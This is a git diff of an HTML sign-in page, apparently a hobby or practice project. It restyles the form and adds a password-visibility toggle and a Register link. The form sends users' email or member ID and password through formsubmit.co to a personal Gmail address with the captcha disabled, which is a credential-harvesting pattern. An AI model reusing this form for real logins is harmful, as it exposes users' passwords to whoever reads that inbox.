@@ -15,19 +15,19 @@
   <body>
     <section>
       <section class="container mt-5">
-        <div class="col-md-6 col-12">
-          <div class="pt-5">
-            <form
-              action="https://formsubmit.co/oladipupomichael9@gmail.com"
-              method="POST"
-            >
-              <input
-                class="forms my-3"
-                type="email"
-                placeholder="Email address or Member ID"
-                name="email"
-                required
-              />
+        <div class="pt-5">
+          <form
+            action="https://formsubmit.co/oladipupomichael9@gmail.com"
+            method="POST"
+          >
+            <input
+              class="forms my-3"
+              type="email"
+              placeholder="Email address or Member ID"
+              name="email"
+              required
+            />
+            <div class="input-box">
               <input
                 class="forms mt-3 mb-2"
                 type="password"
@@ -36,27 +36,53 @@
                 id="password"
                 required
               />
-              <!-- <a onclick="toggleVisibility()">show password</a> -->
-              <p class="mb-3">
-                <a
-                  href="#password"
-                  class="nav-link text-secondary me-3"
-                  id="forgotPassword"
-                  >Forgot password</a
-                >
-              </p>
-              <input type="hidden" name="_subject" value="New Submission" />
-              <input type="hidden" name="_captcha" value="false" />
-              <input type="submit" class="btn btn-orange w-100" />
-            </form>
-            <p class="text-center text-secondary mt-3">Or sign in with:</p>
-            <div class="d-flex justify-content-around">
-              <img class="size" src="./assets//facebook.png" alt="facebook" />
-              <img class="size" src="./assets//google.png" alt="google" />
-              <img class="size" src="./assets//linkedin.png" alt="linkein" />
-              <img class="size" src="./assets//twitter.png" alt="twitter" />
+              <img src="./assets/hide.png" alt="view" id="image" class="text-secondary" onclick="toggleVisibility()">
             </div>
+
+            <!-- <a onclick="toggleVisibility()">show password</a> -->
+            <p class="mb-3">
+              <a
+                href="#password"
+                class="nav-link text-secondary me-3"
+                id="forgotPassword"
+                >Forgot password</a
+              >
+            </p>
+            <input type="hidden" name="_subject" value="New Submission" />
+            <input type="hidden" name="_captcha" value="false" />
+            <input type="submit" class="btn btn-orange w-100" value="Sign In" />
+          </form>
+          <p class="text-center text-secondary mt-3">Or sign in with:</p>
+          <div class="d-flex justify-content-around">
+            <img
+              class="size rounded-circle shadow"
+              src="./assets//facebook.png"
+              alt="facebook"
+            />
+            <img
+              class="size rounded-circle shadow"
+              src="./assets//google.png"
+              alt="google"
+            />
+            <img
+              class="size rounded-circle shadow"
+              src="./assets//linkedin.png"
+              alt="linkein"
+            />
+            <img
+              class="size rounded-circle shadow"
+              src="./assets//twitter.jpeg"
+              alt="twitter"
+            />
           </div>
+          <p class="text-center mt-5 text-secondary">
+            Don't have an account?
+            <span
+              ><a href="" class="text-decoration-none text-orange"
+                >Register</a
+              ></span
+            >
+          </p>
         </div>
       </section>
     </section>
